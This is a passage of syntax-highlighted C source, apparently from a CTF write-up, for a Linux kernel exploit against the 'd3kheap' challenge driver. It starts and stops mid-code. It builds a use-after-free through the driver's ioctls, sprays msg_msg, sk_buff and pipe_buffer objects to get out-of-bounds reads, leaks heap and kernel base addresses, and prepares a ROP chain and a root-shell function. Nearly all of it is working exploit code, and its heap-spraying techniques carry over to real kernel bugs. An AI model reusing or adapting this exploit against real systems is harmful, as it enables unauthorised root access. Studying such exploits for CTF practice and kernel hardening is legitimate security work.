user_rflags;</span><br><span class="line"><span class="type">size_t</span> kernel_offset, kernel_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="type">size_t</span> prepare_kernel_cred, commit_creds, swapgs_restore_regs_and_return_to_usermode, init_cred;</span><br><span class="line"></span><br><span class="line"><span class="type">long</span> dev_fd;</span><br><span class="line"><span class="type">int</span> pipe_fd[<span class="number">2</span>], pipe_fd2[<span class="number">2</span>], pipe_fd_1;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * skb_shared_info need to take 320 bytes at the tail</span></span><br><span class="line"><span class="comment"> * so the max size of buf we should send is:</span></span><br><span class="line"><span class="comment"> * 1024 - 320 = 704</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">char</span> fake_secondary_msg[<span class="number">704</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(dev_fd, OBJ_ADD);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">del</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(dev_fd, OBJ_DEL);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_sp, user_rflags;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">saveStatus</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">uint64_t</span>    next;</span><br><span class="line">    <span class="type">uint64_t</span>    prev;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">    <span class="type">uint64_t</span>    m_type;</span><br><span class="line">    <span class="type">uint64_t</span>    m_ts;</span><br><span class="line">    <span class="type">uint64_t</span>    next;</span><br><span class="line">    <span class="type">uint64_t</span>    security;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">uint64_t</span>    next;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">long</span> mtype;</span><br><span class="line">    <span class="type">char</span> mtext[PRIMARY_MSG_SIZE - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg)];</span><br><span class="line">&#125;primary_msg;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">long</span> mtype;</span><br><span class="line">    <span class="type">char</span> mtext[SECONDARY_MSG_SIZE - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg)];</span><br><span class="line">&#125;secondary_msg;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">long</span> mtype;</span><br><span class="line">    <span class="type">char</span> mtext[<span class="number">0x1000</span> - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg) + <span class="number">0x1000</span> - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msgseg)];</span><br><span class="line">&#125; oob_msg;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">uint64_t</span>    page;</span><br><span class="line">    <span class="type">uint32_t</span>    offset, len;</span><br><span class="line">    <span class="type">uint64_t</span>    ops;</span><br><span class="line">    <span class="type">uint32_t</span>    flags;</span><br><span class="line">    <span class="type">uint32_t</span>    padding;</span><br><span class="line">    <span class="type">uint64_t</span>    private;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">uint64_t</span>    confirm;</span><br><span class="line">    <span class="type">uint64_t</span>    release;</span><br><span class="line">    <span class="type">uint64_t</span>    try_steal;</span><br><span class="line">    <span class="type">uint64_t</span>    get;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">errExit</span><span class="params">(<span class="type">char</span> *msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error: %s\033[0m\n&quot;</span>, msg);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">readMsg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> msgrcv(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="type">long</span>), msgtyp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">writeMsg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span></span><br><span class="line">&#123;</span><br><span class="line">    *(<span class="type">long</span>*)msgp = msgtyp;</span><br><span class="line">    <span class="keyword">return</span> msgsnd(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="type">long</span>), <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">peekMsg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> msgrcv(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="type">long</span>), msgtyp, MSG_COPY | IPC_NOWAIT);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">buildMsg</span><span class="params">(<span class="keyword">struct</span> msg_msg *msg, <span class="type">uint64_t</span> m_list_next,</span></span><br><span class="line"><span class="params">    <span class="type">uint64_t</span> m_list_prev, <span class="type">uint64_t</span> m_type, <span class="type">uint64_t</span> m_ts, </span></span><br><span class="line"><span class="params">    <span class="type">uint64_t</span> next, <span class="type">uint64_t</span> security)</span></span><br><span class="line">&#123;</span><br><span class="line">    msg-&gt;m_list.next = m_list_next;</span><br><span class="line">    msg-&gt;m_list.prev = m_list_prev;</span><br><span class="line">    msg-&gt;m_type = m_type;</span><br><span class="line">    msg-&gt;m_ts = m_ts;</span><br><span class="line">    msg-&gt;next = next;</span><br><span class="line">    msg-&gt;security = security;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">spraySkBuff</span><span class="params">(<span class="type">int</span> sk_socket[SOCKET_NUM][<span class="number">2</span>], <span class="type">void</span> *buf, <span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// printf(&quot;[-] now %d, num %d\n&quot;, i, j);</span></span><br><span class="line">            <span class="keyword">if</span> (write(sk_socket[i][<span class="number">0</span>], buf, size) &lt; <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">freeSkBuff</span><span class="params">(<span class="type">int</span> sk_socket[SOCKET_NUM][<span class="number">2</span>], <span class="type">void</span> *buf, <span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">            <span class="keyword">if</span> (read(sk_socket[i][<span class="number">1</span>], buf, size) &lt; <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getRootShell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (getuid())</span><br><span class="line">        errExit(<span class="string">&quot;failed to gain the root!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Succesfully gain the root privilege, trigerring root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span>         oob_pipe_fd[<span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span>         sk_sockets[SOCKET_NUM][<span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span>         pipe_fd[PIPE_NUM][<span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span>         msqid[MSG_QUEUE_NUM];</span><br><span class="line">    <span class="type">int</span>         victim_qid, real_qid;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span>  *<span class="title">nearby_msg</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span>  *<span class="title">nearby_msg_prim</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">pipe_buf_ptr</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops_ptr</span>;</span></span><br><span class="line">    <span class="type">uint64_t</span>    victim_addr;</span><br><span class="line">    <span class="type">uint64_t</span>    kernel_base;</span><br><span class="line">    <span class="type">uint64_t</span>    kernel_offset;</span><br><span class="line">    <span class="type">uint64_t</span>    *rop_chain;</span><br><span class="line">    <span class="type">int</span>         rop_idx;</span><br><span class="line">    <span class="type">cpu_set_t</span>   cpu_set;</span><br><span class="line"></span><br><span class="line">    saveStatus();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.O</span></span><br><span class="line"><span class="comment">     * Initialization</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// run the exp on specific core only</span></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(<span class="number">0</span>, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// socket pairs to spray sk_buff</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">        <span class="keyword">if</span> (socketpair(AF_UNIX, SOCK_STREAM, <span class="number">0</span>, sk_sockets[i]) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create socket pair!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    dev_fd = open(<span class="string">&quot;/dev/d3kheap&quot;</span>, O_RDONLY);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.I</span></span><br><span class="line"><span class="comment">     * build msg_queue, spray primary and secondary msg_msg,</span></span><br><span class="line"><span class="comment">     * and use OOB write to construct the overlapping</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.I spray msg_msg, construct overlapping object\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Build message queue...&quot;</span>);</span><br><span class="line">    <span class="comment">// build 4096 message queue</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((msqid[i] = msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT)) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create msg_queue!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Spray primary and secondary msg_msg...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;primary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(primary_msg));</span><br><span class="line">    <span class="built_in">memset</span>(&amp;secondary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(secondary_msg));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// get a free object</span></span><br><span class="line">    add();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// spray primary and secondary message</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        *(<span class="type">int</span> *)&amp;primary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">        *(<span class="type">int</span> *)&amp;primary_msg.mtext[<span class="number">4</span>] = i;</span><br><span class="line">        <span class="keyword">if</span> (writeMsg(msqid[i], &amp;primary_msg, </span><br><span class="line">                <span class="keyword">sizeof</span>(primary_msg), PRIMARY_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to send primary msg!&quot;</span>);</span><br><span class="line"></span><br><span class="line">        *(<span class="type">int</span> *)&amp;secondary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">        *(<span class="type">int</span> *)&amp;secondary_msg.mtext[<span class="number">4</span>] = i;</span><br><span class="line">        <span class="keyword">if</span> (writeMsg(msqid[i], &amp;secondary_msg, </span><br><span class="line">                <span class="keyword">sizeof</span>(secondary_msg), SECONDARY_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to send secondary msg!&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">1024</span>)</span><br><span class="line">            del();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.II</span></span><br><span class="line"><span class="comment">     * construct UAF</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.II construct UAF\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// free the victim secondary msg_msg, then we get a UAF</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Trigger UAF...&quot;</span>);</span><br><span class="line">    del();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// spray sk_buff to mark the UAF msg_msg</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray sk_buff...&quot;</span>);</span><br><span class="line">    buildMsg((<span class="keyword">struct</span> msg_msg *)fake_secondary_msg, </span><br><span class="line">            *(<span class="type">uint64_t</span>*)<span class="string">&quot;arttnba3&quot;</span>, *(<span class="type">uint64_t</span>*)<span class="string">&quot;arttnba3&quot;</span>, </span><br><span class="line">            *(<span class="type">uint64_t</span>*)<span class="string">&quot;arttnba3&quot;</span>, SECONDARY_MSG_SIZE, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// find out the UAF queue</span></span><br><span class="line">    victim_qid = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * the msg_msg got changed, so we can&#x27;t read out</span></span><br><span class="line"><span class="comment">         * but it tells us which one the victim is</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="keyword">if</span> (peekMsg(msqid[i], &amp;secondary_msg, <span class="keyword">sizeof</span>(secondary_msg), <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] victim qid: %d\n&quot;</span>, i);</span><br><span class="line">            victim_qid = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (victim_qid == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to make the UAF in msg queue!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (freeSkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] UAF construction complete!\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.III</span></span><br><span class="line"><span class="comment">     * spray sk_buff to leak msg_msg addr</span></span><br><span class="line"><span class="comment">     * construct fake msg_msg to leak addr of UAF obj</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.III spray sk_buff to leak kheap addr\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// spray sk_buff to construct fake msg_msg</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray sk_buff...&quot;</span>);</span><br><span class="line">    buildMsg((<span class="keyword">struct</span> msg_msg *)fake_secondary_msg, </span><br><span class="line">            *(<span class="type">uint64_t</span>*)<span class="string">&quot;arttnba3&quot;</span>, *(<span class="type">uint64_t</span>*)<span class="string">&quot;arttnba3&quot;</span>, </span><br><span class="line">            VICTIM_MSG_TYPE, <span class="number">0x1000</span> - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg), <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// use fake msg_msg to read OOB</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] OOB read from victim msg_msg&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (peekMsg(msqid[victim_qid], &amp;oob_msg, <span class="keyword">sizeof</span>(oob_msg), <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to read victim msg!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (*(<span class="type">int</span> *)&amp;oob_msg.mtext[SECONDARY_MSG_SIZE] != MSG_TAG)</span><br><span class="line">        errExit(<span class="string">&quot;failed to rehit the UAF object!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    nearby_msg = (<span class="keyword">struct</span> msg_msg*) </span><br><span class="line">            &amp;oob_msg.mtext[(SECONDARY_MSG_SIZE) - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg)];</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] addr of primary msg of msg nearby victim: \033[0m%llx\n&quot;</span>, </span><br><span class="line">            nearby_msg-&gt;m_list.prev);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// release and re-spray sk_buff to construct fake msg_msg</span></span><br><span class="line">    <span class="comment">// so that we can make an arbitrary read on a primary msg_msg</span></span><br><span class="line">    <span class="keyword">if</span> (freeSkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    buildMsg((<span class="keyword">struct</span> msg_msg *)fake_secondary_msg, </span><br><span class="line">            *(<span class="type">uint64_t</span>*)<span class="string">&quot;arttnba3&quot;</span>, *(<span class="type">uint64_t</span>*)<span class="string">&quot;arttnba3&quot;</span>, </span><br><span class="line">            VICTIM_MSG_TYPE, <span class="keyword">sizeof</span>(oob_msg.mtext), </span><br><span class="line">            nearby_msg-&gt;m_list.prev - <span class="number">8</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] arbitrary read on primary msg of msg nearby victim&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (peekMsg(msqid[victim_qid], &amp;oob_msg, <span class="keyword">sizeof</span>(oob_msg), <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to read victim msg!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (*(<span class="type">int</span> *)&amp;oob_msg.mtext[<span class="number">0x1000</span>] != MSG_TAG)</span><br><span class="line">        errExit(<span class="string">&quot;failed to rehit the UAF object!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// cal the addr of UAF obj by the header we just read out</span></span><br><span class="line">    nearby_msg_prim = (<span class="keyword">struct</span> msg_msg*) </span><br><span class="line">            &amp;oob_msg.mtext[<span class="number">0x1000</span> - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg)];</span><br><span class="line">    victim_addr = nearby_msg_prim-&gt;m_list.next - <span class="number">0x400</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] addr of msg next to victim: \033[0m%llx\n&quot;</span>, </span><br><span class="line">            nearby_msg_prim-&gt;m_list.next);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] addr of msg UAF object: \033[0m%llx\n&quot;</span>, victim_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.IV</span></span><br><span class="line"><span class="comment">     * fix the header of UAF obj and release it</span></span><br><span class="line"><span class="comment">     * spray pipe_buffer and leak the kernel base</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.IV spray pipe_buffer to leak kernel base\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// re-construct the msg_msg to fix it</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] fixing the UAF obj as a msg_msg...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (freeSkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">memset</span>(fake_secondary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(fake_secondary_msg));</span><br><span class="line">    buildMsg((<span class="keyword">struct</span> msg_msg *)fake_secondary_msg, </span><br><span class="line">            victim_addr + <span class="number">0x800</span>, victim_addr + <span class="number">0x800</span>, <span class="comment">// a valid kheap addr is valid</span></span><br><span class="line">            VICTIM_MSG_TYPE, SECONDARY_MSG_SIZE - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg), </span><br><span class="line">            <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// release UAF obj as secondary msg</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] release UAF obj in message queue...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (readMsg(msqid[victim_qid], &amp;secondary_msg, </span><br><span class="line">                <span class="keyword">sizeof</span>(secondary_msg), VICTIM_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to receive secondary msg!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// spray pipe_buffer</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray pipe_buffer...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create pipe!&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// write something to activate it</span></span><br><span class="line">        <span class="keyword">if</span> (write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;arttnba3&quot;</span>, <span class="number">8</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to write the pipe!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// release the sk_buff to read pipe_buffer, leak kernel base</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] release sk_buff to read pipe_buffer...&quot;</span>);</span><br><span class="line">    pipe_buf_ptr = (<span class="keyword">struct</span> pipe_buffer *) &amp;fake_secondary_msg;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (read(sk_sockets[i][<span class="number">1</span>], &amp;fake_secondary_msg, </span><br><span class="line">                    <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">                errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (pipe_buf_ptr-&gt;ops &gt; <span class="number">0xffffffff81000000</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] got anon_pipe_buf_ops: \033[0m%llx\n&quot;</span>, </span><br><span class="line">                        pipe_buf_ptr-&gt;ops);</span><br><span class="line">                kernel_offset = pipe_buf_ptr-&gt;ops - ANON_PIPE_BUF_OPS;</span><br><span class="line">                kernel_base = <span class="number">0xffffffff81000000</span> + kernel_offset;</span><br><span class="line">            &#125;</span><br><span class="line">        